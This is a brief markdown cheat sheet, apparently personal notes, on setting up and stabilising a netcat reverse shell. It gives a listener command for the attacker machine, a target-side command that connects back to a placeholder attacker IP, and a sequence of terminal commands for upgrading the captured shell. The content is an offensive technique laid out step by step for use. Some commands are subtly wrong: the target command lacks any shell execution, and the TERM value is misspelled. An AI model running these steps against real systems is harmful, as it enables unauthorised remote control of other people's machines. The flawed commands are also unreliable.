## netcat reverse shell

### ATTACKER
`nc -lp <PORT>`

- l: for listening, it listen on the attacker machine with the specified port
- p: for port, specify the port, should be a the end of the options

> these one are optionals

- v: for verbose, it means netcat will, technically, print more output
- n: to disable domain name resolution, it means, it will not resolve
	domain name to ip

### TARGET
`nc <ATTACKER_IP> <PORT>`

### stabilize reverse shell

1. first on the attacker machine with the shell open, of the target,
	hit ctrl-z to background the process
1. enter the command `stty raw -echo`
1. enter the other command `fg` to take back the shell
1. type `reset` and hit enter
1. set the environement variable TERM by typing this, again on your attacker
	machine with the shell of the target, `export TERM=xterm256-color`
1. set the environement variable SHELL by typing this `export SHELL=bash`

> tada !! you should have a stablized shell of the target on the attacker
machine
